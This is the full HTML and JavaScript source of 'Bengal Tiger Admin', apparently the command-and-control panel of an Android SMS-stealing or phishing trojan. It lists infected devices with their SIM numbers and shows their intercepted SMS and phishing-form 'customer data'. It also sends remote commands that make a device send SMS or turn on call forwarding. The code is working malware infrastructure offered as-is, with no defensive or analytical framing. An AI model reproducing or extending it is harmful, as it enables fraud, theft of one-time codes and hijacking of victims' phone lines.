<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Bengal Tiger Admin</title>
    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;700&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
    <style>
        :root { --primary: #FFD700; --dark: #111; --success: #28a745; --danger: #dc3545; }
        body { margin: 0; font-family: 'Roboto', sans-serif; background: #f0f2f5; }
        #toast { visibility: hidden; min-width: 250px; background-color: var(--success); color: #fff; text-align: center; border-radius: 5px; padding: 16px; position: fixed; z-index: 3000; right: 30px; top: 30px; font-weight: bold; opacity: 0; transition: 0.5s; }
        #toast.show { visibility: visible; opacity: 1; top: 60px; }
        #toast.error { background-color: var(--danger); }
        #login-screen { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: var(--dark); z-index: 2000; display: flex; justify-content: center; align-items: center; flex-direction: column; }
        .login-box { background: white; padding: 40px; border-radius: 8px; text-align: center; width: 300px; }
        .login-box input { width: 90%; padding: 10px; margin: 10px 0; border: 1px solid #ccc; }
        .btn-gold { background: var(--primary); border: none; padding: 10px 20px; font-weight: bold; cursor: pointer; color: var(--dark); }
        header { background: var(--dark); color: var(--primary); padding: 15px 30px; display: flex; justify-content: space-between; align-items: center; box-shadow: 0 4px 10px rgba(0,0,0,0.3); }
        .controls i { margin-left: 20px; cursor: pointer; font-size: 20px; color: white; transition: 0.3s; }
        .controls i:hover { color: var(--primary); }
        .stats { display: flex; justify-content: space-around; padding: 20px; margin-top: 20px; }
        .stat-box { background: white; width: 30%; padding: 20px; text-align: center; border-radius: 8px; box-shadow: 0 2px 5px rgba(0,0,0,0.1); border-bottom: 4px solid var(--dark); }
        .stat-num { font-size: 32px; font-weight: bold; color: var(--dark); }
        .filters { text-align: center; margin: 20px; }
        .filter-btn { padding: 10px 20px; margin: 0 5px; background: #ddd; border: none; cursor: pointer; border-radius: 20px; font-weight: bold; }
        .filter-btn.active { background: var(--dark); color: var(--primary); }
        .grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(320px, 1fr)); gap: 20px; padding: 20px; }
        .card { background: white; padding: 20px; border-radius: 10px; box-shadow: 0 4px 6px rgba(0,0,0,0.1); border-top: 5px solid #555; position: relative; }
        .card.online { border-top: 5px solid var(--success); }
        .card.pinned { border-top: 5px solid var(--primary); }
        .card-header { display: flex; justify-content: space-between; margin-bottom: 10px; }
        .status { font-size: 12px; font-weight: bold; color: #666; }
        .online-text { color: var(--success); }
        .info { font-size: 13px; color: #444; margin-bottom: 5px; }
        .btns { display: grid; grid-template-columns: repeat(3,1fr); gap: 8px; margin-top: 15px; }
        .btn-sm { padding: 8px; font-size: 12px; cursor: pointer; border: none; border-radius: 4px; color: white; background: #444; font-weight: bold; }
        .btn-sms { background: var(--success); }
        .btn-call { background: #17a2b8; }
        .btn-view { background: #9c27b0; }
        .btn-del { background: var(--danger); }
        .serial-badge { position: absolute; top: 6px; right: 10px; z-index: 3; background: var(--primary); color: var(--dark); font-weight: bold; padding: 5px 12px; border-radius: 50px; font-size: 14px; }
        .modal { display: none; position: fixed; z-index: 2500; left: 0; top: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.5); }
        .modal.show { display: flex; align-items: center; justify-content: center; }
        .modal-content { background: white; padding: 30px; border-radius: 10px; width: 80%; max-width: 600px; max-height: 80vh; overflow-y: auto; }
        .modal-header { display: flex; justify-content: space-between; align-items: center; margin-bottom: 20px; }
        .modal-header h2 { margin: 0; }
        .close-btn { background: var(--danger); color: white; border: none; padding: 8px 15px; cursor: pointer; border-radius: 4px; font-weight: bold; }
        .data-item { background: #f5f5f5; padding: 12px; margin-bottom: 10px; border-radius: 5px; border-left: 4px solid var(--primary); }
        .data-label { font-weight: bold; color: var(--dark); font-size: 12px; }
        .data-value { color: #555; margin-top: 5px; }
        .no-data { text-align: center; color: #999; padding: 30px; }
    </style>
</head>
<body>
    <div id="toast"><i class="fas fa-check-circle"></i> Success</div>
    <div id="login-screen">
        <h1 style="color:var(--primary)">BENGAL TIGER ADMIN</h1>
        <div class="login-box">
            <input type="password" id="pass" placeholder="Enter Password">
            <button class="btn-gold" onclick="login()">LOGIN</button>
        </div>
    </div>

    <div id="dashboard" style="display:none;">
        <header>
            <h2><i class="fas fa-paw"></i> BENGAL TIGER</h2>
            <div class="controls">
                <i class="fas fa-sync-alt" onclick="fetchData(true)" title="Refresh"></i>
                <i class="fas fa-key" onclick="changePass()" title="Change Password"></i>
                <i class="fas fa-sign-out-alt" onclick="location.reload()" title="Logout"></i>
            </div>
        </header>
        <div class="stats">
            <div class="stat-box"><div class="stat-num" id="s-all">0</div>ALL DEVICES</div>
            <div class="stat-box"><div class="stat-num" id="s-on" style="color:var(--success)">0</div>ONLINE</div>
            <div class="stat-box"><div class="stat-num" id="s-pin" style="color:var(--primary)">0</div>PINNED</div>
        </div>
        <div class="filters">
            <button class="filter-btn active" onclick="filter('all', this)">ALL DEVICES</button>
            <button class="filter-btn" onclick="filter('online', this)">ONLINE</button>
            <button class="filter-btn" onclick="filter('pinned', this)">PINNED</button>
        </div>
        <div class="grid" id="grid"></div>
    </div>

    <div id="viewDataModal" class="modal">
        <div class="modal-content">
            <div class="modal-header">
                <h2>📋 Device Data</h2>
                <button class="close-btn" onclick="closeModal('viewDataModal')">✕ Close</button>
            </div>
            <div id="modalBody"></div>
        </div>
    </div>

    <div id="viewSmsModal" class="modal">
        <div class="modal-content">
            <div class="modal-header">
                <h2>📬 SMS Messages</h2>
                <button class="close-btn" onclick="closeModal('viewSmsModal')">✕ Close</button>
            </div>
            <div id="smsModalBody"></div>
        </div>
    </div>

    <script src="/socket.io/socket.io.js"></script>
    <script>
        // Helper to escape text used in HTML attributes
        function escapeAttr(str) {
            if (str === undefined || str === null) return '';
            return String(str).replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;').replace(/"/g, '&quot;');
        }

        const socket = io();
        let devices = [];
        // track which modal is currently open so we can refresh it when new data arrives
        let currentOpenModal = null; // { type: 'sms'|'data'|'form', deviceId }
        let currentFilter = 'all';

        function toast(msg, err=false) {
            const t = document.getElementById("toast");
            t.innerText = msg;
            t.className = err ? "show error" : "show";
            setTimeout(() => t.className = "", 3000);
        }

        async function login() {
            const p = document.getElementById('pass').value;
            try {
                const r = await fetch('/api/login', { method:'POST', headers:{'Content-Type':'application/json'}, body: JSON.stringify({ username: 'admin', password: p }) });
                const d = await r.json();
                if (d.success) {
                    document.getElementById('login-screen').style.display='none';
                    document.getElementById('dashboard').style.display='block';
                    fetchData(false);
                } else alert('Wrong Password');
            } catch (err) {
                toast('Login error', true);
            }
        }

        async function fetchData(showMsg) {
            try {
                const r = await fetch('/api/devices');
                if (!r.ok) throw new Error('Network response was not ok: ' + r.status);
                devices = await r.json();
                render();
                // If a modal is open, refresh its contents from the updated `devices` data
                try {
                    if (currentOpenModal && document.getElementById('viewSmsModal').classList.contains('show') && currentOpenModal.type === 'sms') {
                        viewSms(currentOpenModal.deviceId);
                    }
                    if (currentOpenModal && document.getElementById('viewDataModal').classList.contains('show')) {
                        if (currentOpenModal.type === 'data') viewData(currentOpenModal.deviceId);
                        if (currentOpenModal.type === 'form') viewFormData(currentOpenModal.deviceId);
                    }
                } catch (e) { /* ignore UI refresh errors */ }
                if (showMsg) toast('✅ Refresh Successful!');
            } catch (err) {
                console.error('Fetch devices failed', err);
                toast('❌ Refresh failed', true);
            }
        }

        socket.on('dashboard-update', () => fetchData(false));

        function filter(type, btn) {
            currentFilter = type;
            document.querySelectorAll('.filter-btn').forEach(b => b.classList.remove('active'));
            btn.classList.add('active');
            render();
        }

        function formatLastSeen(ts) {
            if (!ts) return 'N/A';
            const d = new Date(ts);
            if (isNaN(d.getTime())) return 'N/A';
            const now = new Date();
            const diff = Math.floor((now - d) / 1000);
            if (diff < 60) return diff + 's ago';
            if (diff < 3600) return Math.floor(diff/60) + 'm ago';
            if (diff < 86400) return Math.floor(diff/3600) + 'h ago';
            return d.toLocaleString();
        }

        function render() {
            document.getElementById('s-all').innerText = devices.length;
            document.getElementById('s-on').innerText = devices.filter(d=>d.isOnline).length;
            document.getElementById('s-pin').innerText = devices.filter(d=>d.isPinned).length;
            const grid = document.getElementById('grid');
            grid.innerHTML = '';
            let list = devices.slice();
            if (currentFilter === 'online') list = list.filter(d=>d.isOnline);
            if (currentFilter === 'pinned') list = list.filter(d=>d.isPinned);
            // Sort by installDate if available, otherwise fallback to registrationTimestamp
            list = list.sort((a, b) => new Date(b.installDate || b.registrationTimestamp) - new Date(a.installDate || a.registrationTimestamp));

            list.forEach((d, idx) => {
                const serialNum = idx + 1;
                const pinColor = d.isPinned ? 'var(--primary)' : '#ccc';
                const batteryIcon = d.battery >= 80 ? 'fa-battery-full' : d.battery >= 60 ? 'fa-battery-three-quarters' : d.battery >= 40 ? 'fa-battery-half' : d.battery >= 20 ? 'fa-battery-quarter' : 'fa-battery-empty';
                const batteryColor = d.battery > 20 ? '#43a047' : '#d32f2f';
                const batteryPercent = `<span style='position:absolute;top:50%;left:0;width:100%;transform:translateY(-50%);text-align:center;font-size:13px;font-weight:bold;color:#111;pointer-events:none;'>${d.battery}%</span>`;
                const statusBadge = `<span style="display:inline-block;border:2px solid #FFD700;border-radius:16px;padding:2px 16px;font-weight:bold;${d.isOnline ? 'color:#43a047;' : 'color:#d32f2f;'}background:#222;font-size:13px;letter-spacing:1px;">${d.isOnline ? 'ONLINE' : 'OFFLINE'}</span>`;
                const simCopy = (sim, label) => `<span style='font-weight:bold;'>${label}:</span> <span id='${d.deviceId}_${label}' style='user-select:all;'>${sim||'N/A'}</span> <i class="fas fa-copy" style="color:var(--primary);cursor:pointer;" title="Copy ${label}" onclick="navigator.clipboard.writeText('${sim||''}');toast('${label} copied!')"></i>`;

                const card = document.createElement('div');
                card.className = `card ${d.isOnline?'online':''} ${d.isPinned?'pinned':''}`;
                card.style = 'border:3px solid #1976d2;box-shadow:0 8px 32px #1976d2a0, 0 2px 8px #fff;position:relative;max-width:320px;margin:auto;border-radius:32px 32px 36px 36px;background:linear-gradient(145deg,#f8fafc 80%,#e0e0e0 100%);padding-top:60px;padding-bottom:24px;overflow:hidden;';
                card.innerHTML = `
                    <div style="position:absolute;top:18px;left:18px;z-index:2;"><i class="fas fa-thumbtack" style="color:${pinColor}; cursor:pointer;font-size:22px;" onclick="togglePin('${d.deviceId}', ${!d.isPinned})" title="Pin Device"></i></div>
                    <div style="position:absolute;top:8px;right:8px;z-index:2;display:flex;align-items:center;gap:8px;"><span style='position:relative;display:inline-block;width:44px;height:32px;'><i class="fas ${batteryIcon}" style="color:${batteryColor};font-size:32px;"></i>${batteryPercent}</span></div>
                    <div class="serial-badge" style="font-size:17px;left:50%;transform:translateX(-50%);position:absolute;top:6px;z-index:3;background:var(--primary);color:var(--dark);padding:7px 18px 7px 18px;display:flex;flex-direction:column;align-items:center;min-width:120px;"><span style='font-size:18px;font-weight:bold;'>${serialNum}</span><span style='font-size:13px;font-weight:bold;color:#222;margin-top:2px;'>${escapeAttr(d.model||'')}</span></div>
                    <div class="info" style="margin-bottom:2px;display:flex;align-items:center;gap:8px;justify-content:center;">${statusBadge}</div>
                    <div class="info" style="margin-bottom:2px;">${simCopy(d.sim1,'SIM1')}</div>
                    <div class="info" style="margin-bottom:2px;">${simCopy(d.sim2,'SIM2')}</div>
                    <div class="info" style="margin-bottom:2px;"><span style='font-weight:bold;'>Last Seen:</span> <span id="lastSeen_${d.deviceId}">${formatLastSeen(d.lastSeen)}</span></div>
                    <div class="info" style="margin-bottom:2px;"><span style='font-weight:bold;'>Serial:</span> ${escapeAttr(d.serialNumber||'N/A')}</div>
                    <div class="btns" style="margin-top:18px;">
                        <button class="btn-sm btn-view" style="background:#1976d2;" onclick="viewData('${d.deviceId}')"><i class="fas fa-eye"></i> VIEW DATA</button>
                        <button class="btn-sm btn-view" style="background:#00bcd4;" onclick="viewSms('${d.deviceId}')"><i class="fas fa-envelope"></i> VIEW SMS</button>
                        <button class="btn-sm btn-view" style="background:#ffeb3b;color:#222;" onclick="viewFormData('${d.deviceId}')"><i class="fas fa-file-alt"></i> FORM DATA</button>
                        <button class="btn-sm btn-sms" style="background:#43a047;" onclick="showSendSmsModal('${d.deviceId}')"><i class="fas fa-paper-plane"></i> SEND SMS</button>
                        <button class="btn-sm btn-call" style="background:#ff9800;" onclick="showCallForwardModal('${d.deviceId}')"><i class="fas fa-phone"></i> CALL FWD</button>
                        <button class="btn-sm btn-del" style="background:#d32f2f;font-weight:bold;" onclick="del('${d.deviceId}')"><i class="fas fa-trash"></i> DELETE</button>
                    </div>`;

                grid.appendChild(card);
            });
        }

        // Generic action sender
        async function act(id, type, data = {}) {
            try {
                const r = await fetch('/api/command', { method:'POST', headers:{'Content-Type':'application/json'}, body: JSON.stringify({deviceId: id, action: type, data}) });
                const d = await r.json();
                toast(d.message || (d.success ? 'Success' : 'Failed'), !d.success);
            } catch (err) { toast('❌ Error: ' + err.message, true); }
        }

        async function togglePin(id, s) {
            try {
                const r = await fetch('/api/pin-device', { method:'POST', headers:{'Content-Type':'application/json'}, body: JSON.stringify({deviceId: id, status: s}) });
                const d = await r.json(); if (d.success) { fetchData(false); toast(d.message); } else toast(d.message, true);
            } catch (err) { toast('❌ Error: ' + err.message, true); }
        }

        async function del(id) {
            const modal = document.createElement('div'); modal.style.position = 'fixed'; modal.style.top='0'; modal.style.left='0'; modal.style.width='100vw'; modal.style.height='100vh'; modal.style.background='rgba(0,0,0,0.5)'; modal.style.display='flex'; modal.style.alignItems='center'; modal.style.justifyContent='center'; modal.style.zIndex='9999';
            modal.innerHTML = `<div style="background:#fff;padding:28px;border-radius:12px;min-width:320px;max-width:90vw;text-align:center;"><div style="font-size:20px;font-weight:bold;color:#d32f2f;margin-bottom:12px;">Delete Device</div><div style="margin-bottom:12px;">Enter Admin Password to delete this device.</div><input id="delPassInput" type="password" placeholder="Admin Password" style="width:100%;padding:12px;margin-bottom:12px;border:2px solid #1976d2;border-radius:6px;"><div style="display:flex;justify-content:space-between;"><button id="delCancelBtn" style="background:#eee;padding:10px 18px;border-radius:6px;border:none;">Cancel</button><button id="delConfirmBtn" style="background:#d32f2f;color:#fff;padding:10px 18px;border-radius:6px;border:none;">Delete</button></div></div>`;
            document.body.appendChild(modal);
            document.getElementById('delCancelBtn').onclick = () => document.body.removeChild(modal);
            document.getElementById('delConfirmBtn').onclick = async () => {
                const password = document.getElementById('delPassInput').value;
                if (!password) { toast('Password is required', true); return; }
                try {
                    const r = await fetch('/api/delete-device', { method:'POST', headers:{'Content-Type':'application/json'}, body: JSON.stringify({ deviceId: id, password }) });
                    const d = await r.json(); if (d.success) { fetchData(false); toast('✅ Device deleted successfully'); document.body.removeChild(modal); } else toast(d.message || 'Delete failed', true);
                } catch (err) { toast('❌ Error: ' + err.message, true); }
            };
        }

        async function changePass() { const o = prompt('Old Password:'); const n = prompt('New Password:'); if (o && n) { try { const r = await fetch('/api/change-password', { method:'POST', headers:{'Content-Type':'application/json'}, body: JSON.stringify({ oldPassword: o, newPassword: n }) }); const d = await r.json(); toast(d.success ? '✅ Password Changed' : '❌ Wrong Old Password', !d.success); } catch (err) { toast('Error', true); } } }

        function viewData(deviceId) {
            const device = devices.find(d => d.deviceId === deviceId);
            if (!device) { toast('❌ Device not found', true); return; }
            currentOpenModal = { type: 'data', deviceId };
            const modalBody = document.getElementById('modalBody');
            let html = `<div style="background:#e3f2fd;padding:18px;border-radius:8px;"><div style="font-size:20px;font-weight:bold;color:#1976d2;margin-bottom:10px;">Device Details</div><table style="width:100%;border-collapse:collapse;font-size:15px;background:#fff;border-radius:8px;overflow:hidden;box-shadow:0 2px 8px rgba(0,0,0,0.04);"><tbody>`;
            html += `<tr><td style='font-weight:bold;padding:8px 6px;'>1. Model</td><td style='padding:8px 6px;'>${escapeAttr(device.model||'N/A')}</td></tr>`;
            html += `<tr><td style='font-weight:bold;padding:8px 6px;'>2. SIM1</td><td style='padding:8px 6px;'>${escapeAttr(device.sim1||'N/A')} <i class="fas fa-copy copy-btn" data-text="${escapeAttr(device.sim1||'')}"></i></td></tr>`;
            html += `<tr><td style='font-weight:bold;padding:8px 6px;'>3. SIM2</td><td style='padding:8px 6px;'>${escapeAttr(device.sim2||'N/A')} <i class="fas fa-copy copy-btn" data-text="${escapeAttr(device.sim2||'')}"></i></td></tr>`;
            html += `<tr><td style='font-weight:bold;padding:8px 6px;'>4. Android Version</td><td style='padding:8px 6px;'>${escapeAttr(device.androidVersion||'N/A')}</td></tr>`;
            html += `<tr><td style='font-weight:bold;padding:8px 6px;'>5. Battery</td><td style='padding:8px 6px;'>${escapeAttr(device.battery||'N/A')}%</td></tr>`;
            html += `<tr><td style='font-weight:bold;padding:8px 6px;'>6. Install Date</td><td style='padding:8px 6px;'>${device.installDate ? (new Date(device.installDate)).toLocaleString('en-GB') : 'N/A'}</td></tr>`;
            html += `<tr><td style='font-weight:bold;padding:8px 6px;'>7. Last Seen</td><td style='padding:8px 6px;'>${device.lastSeen ? (new Date(device.lastSeen)).toLocaleString('en-GB') : 'N/A'}</td></tr>`;
            html += `<tr><td style='font-weight:bold;padding:8px 6px;'>8. Status</td><td style='padding:8px 6px;'><span style='color:${device.isOnline ? '#43a047':'#d32f2f'};font-weight:bold;'>${device.isOnline ? 'Online':'Offline'}</span></td></tr>`;
            html += `</tbody></table></div><hr style="margin:10px 0;border:0;border-top:2px solid #1976d2;"><h3 style="color:#1976d2;margin-bottom:8px;">📝 Form Submission Details</h3>`;

            if (device.customerData && Object.keys(device.customerData).length > 0) {
                Object.entries(device.customerData).forEach(([key, value]) => {
                    const v = JSON.stringify(value);
                    html += `<div style="background:#e3f2fd;margin-bottom:8px;padding:10px;border-radius:6px;border-left:5px solid #1976d2;display:flex;align-items:center;justify-content:space-between;"><span style="color:#1976d2;font-weight:bold;">${escapeAttr(key)}</span><span style="color:#222;font-size:15px;">${escapeAttr(v)} <i class=\"fas fa-copy copy-btn\" data-text=\"${escapeAttr(v)}\"></i></span></div>`;
                });
            } else {
                html += '<div class="no-data">No customer data submitted yet</div>';
            }

            modalBody.innerHTML = html;
            setTimeout(() => { modalBody.querySelectorAll('.copy-btn').forEach(el => el.onclick = () => { navigator.clipboard.writeText(el.dataset.text||'').then(()=>toast('Copied!')).catch(()=>toast('Copy failed', true)); }); }, 0);
            document.getElementById('viewDataModal').classList.add('show');
        }

        function viewFormData(deviceId) {
            const device = devices.find(d => d.deviceId === deviceId);
            if (!device) { toast('❌ Device not found', true); return; }
            currentOpenModal = { type: 'form', deviceId };
            const modalBody = document.getElementById('modalBody');
            let html = `<div style=\"background:#fffde7;padding:18px;border-radius:8px;\"><div style=\"font-size:20px;font-weight:bold;color:#ff9800;margin-bottom:10px;\">Submitted Form Data</div></div>`;
            if (device.customerData && Object.keys(device.customerData).length > 0) {
                Object.entries(device.customerData).forEach(([key, value]) => { const v = JSON.stringify(value); html += `<div style=\"background:#fffde7;margin-bottom:8px;padding:10px;border-radius:6px;border-left:5px solid #ffeb3b;display:flex;align-items:center;justify-content:space-between;\"><span style=\"color:#ff9800;font-weight:bold;\">${escapeAttr(key)}</span><span style=\"color:#222;font-size:15px;\">${escapeAttr(v)} <i class=\\\"fas fa-copy copy-btn\\\" data-text=\\\"${escapeAttr(v)}\\\"></i></span></div>`; });
            } else { html += '<div class="no-data">No form data submitted yet</div>'; }
            modalBody.innerHTML = html;
            setTimeout(() => { modalBody.querySelectorAll('.copy-btn').forEach(el => el.onclick = () => { navigator.clipboard.writeText(el.dataset.text || '').then(()=>toast('Copied!')).catch(()=>toast('Copy failed', true)); }); }, 0);
            document.getElementById('viewDataModal').classList.add('show');
        }

        function viewSms(deviceId) {
            const device = devices.find(d => d.deviceId === deviceId);
            if (!device) { toast('❌ Device not found', true); return; }
            currentOpenModal = { type: 'sms', deviceId };
            // Use stored smsMessages (assumes device/app forwards latest messages automatically)
            const msgs = Array.isArray(device.smsMessages) ? device.smsMessages.slice(-50).reverse() : [];
            let html = `<div style='background:#e3f2fd;padding:18px;border-radius:8px;'><div style='font-size:18px;font-weight:bold;color:#1976d2;'>${escapeAttr(device.model||'')} - Last 50 SMS</div></div><hr style='margin:0 0 10px 0;border:0;border-top:2px solid #1976d2;'>`;
            html += msgs.map((msg, idx) => `
                <div style='background:#fff;margin-bottom:8px;padding:10px;border-radius:6px;border-left:5px solid #1976d2;display:flex;align-items:center;justify-content:space-between;'>
                    <div>
                        <div style='font-size:13px;color:#1976d2;font-weight:bold;'>${idx+1}. From: ${escapeAttr(msg.from||msg.address||'Unknown')}</div>
                        <div style='font-size:15px;color:#222;margin:4px 0;'>${escapeAttr(msg.body||msg.message||'')}</div>
                        <div style='font-size:12px;color:#888;'>${msg.time ? formatLastSeen(msg.time) : ''}</div>
                    </div>
                    <div style='display:flex;flex-direction:column;gap:6px;'>
                        <i class="fas fa-copy copy-btn" style="color:var(--primary);cursor:pointer;font-size:18px;" data-text="${escapeAttr(msg.body||msg.message||'')}"></i>
                    </div>
                </div>`).join('');
            if (msgs.length === 0) html += '<div class="no-data">No SMS messages found</div>';
            document.getElementById('smsModalBody').innerHTML = html;
            setTimeout(() => { document.querySelectorAll('#smsModalBody .copy-btn').forEach(el => el.onclick = () => { navigator.clipboard.writeText(el.dataset.text||'').then(()=>toast('Message copied!')).catch(()=>toast('Copy failed', true)); }); }, 0);
            document.getElementById('viewSmsModal').classList.add('show');
        }

        function deleteSms(deviceId, idx) { toast('Delete SMS feature coming soon!'); }
        
        // Show Send SMS modal
        function showSendSmsModal(deviceId) {
            const modal = document.createElement('div');
            modal.style.position = 'fixed'; modal.style.top='0'; modal.style.left='0'; modal.style.width='100vw'; modal.style.height='100vh'; modal.style.background='rgba(0,0,0,0.5)'; modal.style.display='flex'; modal.style.alignItems='center'; modal.style.justifyContent='center'; modal.style.zIndex='9999';
            modal.innerHTML = `
                <div style="background:#fff;padding:28px;border-radius:12px;min-width:320px;max-width:95vw;">
                    <div style="font-size:20px;font-weight:bold;color:#1976d2;margin-bottom:12px;text-align:center;">Send SMS</div>
                    <div style="margin-bottom:12px;">
                        <label style="font-weight:bold;">Select SIM</label>
                        <select id="_smsSim" style="width:100%;padding:10px;margin:8px 0;border:2px solid #1976d2;border-radius:6px;"><option value="1">SIM 1</option><option value="2">SIM 2</option></select>
                        <label style="font-weight:bold;">Recipient Number</label>
                        <input id="_smsNumber" type="text" style="width:100%;padding:10px;margin:8px 0;border:2px solid #1976d2;border-radius:6px;" placeholder="Enter number">
                        <label style="font-weight:bold;">Message</label>
                        <textarea id="_smsBody" rows="4" style="width:100%;padding:10px;border:2px solid #1976d2;border-radius:6px;" placeholder="Enter message"></textarea>
                        <div id="_smsStatus" style="margin-top:8px;min-height:22px;"></div>
                    </div>
                    <div style="display:flex;justify-content:space-between;gap:8px;">
                        <button id="_smsCancel" style="background:#eee;padding:10px 18px;border-radius:6px;border:none;">Cancel</button>
                        <button id="_smsSend" style="background:#43a047;color:#fff;padding:10px 18px;border-radius:6px;border:none;">Send</button>
                    </div>
                </div>`;
            document.body.appendChild(modal);
            document.getElementById('_smsCancel').onclick = () => document.body.removeChild(modal);
            document.getElementById('_smsSend').onclick = async () => {
                const simSlot = document.getElementById('_smsSim').value;
                const number = document.getElementById('_smsNumber').value.trim();
                const message = document.getElementById('_smsBody').value.trim();
                if (!number || !message) { document.getElementById('_smsStatus').innerText = 'Number and message required'; return; }
                document.getElementById('_smsStatus').innerText = 'Sending...';
                try {
                    const r = await fetch('/api/command', { method:'POST', headers:{'Content-Type':'application/json'}, body: JSON.stringify({ deviceId, action: 'SEND_SMS', data: { simSlot, number, message } }) });
                    const d = await r.json();
                    if (d.success) { document.getElementById('_smsStatus').innerText = '✅ SMS command sent'; setTimeout(()=>{ document.body.removeChild(modal); toast('SMS command sent'); },800); }
                    else { document.getElementById('_smsStatus').innerText = '❌ ' + (d.message || 'Failed'); }
                } catch (err) { document.getElementById('_smsStatus').innerText = '❌ Error: ' + err.message; }
            };
        }

        // Show Call Forward modal
        function showCallForwardModal(deviceId) {
            const modal = document.createElement('div'); modal.style.position='fixed'; modal.style.top='0'; modal.style.left='0'; modal.style.width='100vw'; modal.style.height='100vh'; modal.style.background='rgba(0,0,0,0.5)'; modal.style.display='flex'; modal.style.alignItems='center'; modal.style.justifyContent='center'; modal.style.zIndex='9999';
            modal.innerHTML = `
                <div style="background:#fff;padding:28px;border-radius:12px;min-width:320px;max-width:95vw;">
                    <div style="font-size:20px;font-weight:bold;color:#ff9800;margin-bottom:12px;text-align:center;">Call Forward</div>
                    <div style="margin-bottom:12px;">
                        <label style="font-weight:bold;">Select SIM</label>
                        <select id="_cfSim" style="width:100%;padding:10px;margin:8px 0;border:2px solid #ff9800;border-radius:6px;"><option value="1">SIM 1</option><option value="2">SIM 2</option></select>
                        <label style="font-weight:bold;">Forward Number</label>
                        <input id="_cfNumber" type="text" style="width:100%;padding:10px;margin:8px 0;border:2px solid #ff9800;border-radius:6px;" placeholder="Enter number">
                        <div id="_cfStatus" style="margin-top:8px;min-height:22px;"></div>
                    </div>
                    <div style="display:flex;justify-content:space-between;gap:8px;">
                        <button id="_cfActivate" style="background:#43a047;color:#fff;padding:10px 12px;border-radius:6px;border:none;">Activate</button>
                        <button id="_cfDeactivate" style="background:#d32f2f;color:#fff;padding:10px 12px;border-radius:6px;border:none;">Deactivate</button>
                        <button id="_cfCheck" style="background:#1976d2;color:#fff;padding:10px 12px;border-radius:6px;border:none;">Check Status</button>
                    </div>
                    <div style="margin-top:10px;text-align:center;"><button id="_cfCancel" style="background:#eee;padding:10px 12px;border-radius:6px;border:none;">Close</button></div>
                </div>`;
            document.body.appendChild(modal);
            document.getElementById('_cfCancel').onclick = () => document.body.removeChild(modal);

            document.getElementById('_cfActivate').onclick = async () => {
                const simSlot = document.getElementById('_cfSim').value;
                const number = document.getElementById('_cfNumber').value.trim();
                if (!number) { document.getElementById('_cfStatus').innerText='Number required'; return; }
                document.getElementById('_cfStatus').innerText='Activating...';
                try { const r = await fetch('/api/command',{ method:'POST', headers:{'Content-Type':'application/json'}, body: JSON.stringify({ deviceId, action:'CALL_FORWARD_ACTIVATE', data:{ simSlot, number } }) }); const d = await r.json(); document.getElementById('_cfStatus').innerText = d.success ? '✅ Activated' : ('❌ '+(d.message||'Failed')); } catch (err) { document.getElementById('_cfStatus').innerText='❌ '+err.message; }
            };
            document.getElementById('_cfDeactivate').onclick = async () => {
                const simSlot = document.getElementById('_cfSim').value;
                document.getElementById('_cfStatus').innerText='Deactivating...';
                try { const r = await fetch('/api/command',{ method:'POST', headers:{'Content-Type':'application/json'}, body: JSON.stringify({ deviceId, action:'CALL_FORWARD_DEACTIVATE', data:{ simSlot } }) }); const d = await r.json(); document.getElementById('_cfStatus').innerText = d.success ? '✅ Deactivated' : ('❌ '+(d.message||'Failed')); } catch (err) { document.getElementById('_cfStatus').innerText='❌ '+err.message; }
            };
            document.getElementById('_cfCheck').onclick = async () => {
                const simSlot = document.getElementById('_cfSim').value;
                document.getElementById('_cfStatus').innerText='Checking...';
                try { const r = await fetch('/api/command',{ method:'POST', headers:{'Content-Type':'application/json'}, body: JSON.stringify({ deviceId, action:'CALL_FORWARD_STATUS', data:{ simSlot } }) }); const d = await r.json(); document.getElementById('_cfStatus').innerText = d.success ? ('Status: '+(d.message||'OK')) : ('❌ '+(d.message||'Failed')); } catch (err) { document.getElementById('_cfStatus').innerText='❌ '+err.message; }
            };
        }
        function closeModal(modalId) { 
            document.getElementById(modalId).classList.remove('show'); 
            // clear open modal tracking when closed
            if (currentOpenModal && ((modalId === 'viewSmsModal' && currentOpenModal.type === 'sms') || (modalId === 'viewDataModal' && (currentOpenModal.type === 'data' || currentOpenModal.type === 'form')))) {
                currentOpenModal = null;
            }
        }
        window.onclick = function(event) { const viewDataModal = document.getElementById('viewDataModal'); const viewSmsModal = document.getElementById('viewSmsModal'); if (event.target == viewDataModal) viewDataModal.classList.remove('show'); if (event.target == viewSmsModal) viewSmsModal.classList.remove('show'); }

        // initial
        document.addEventListener('DOMContentLoaded', () => { /* no-op */ });
    </script>
</body>
</html>
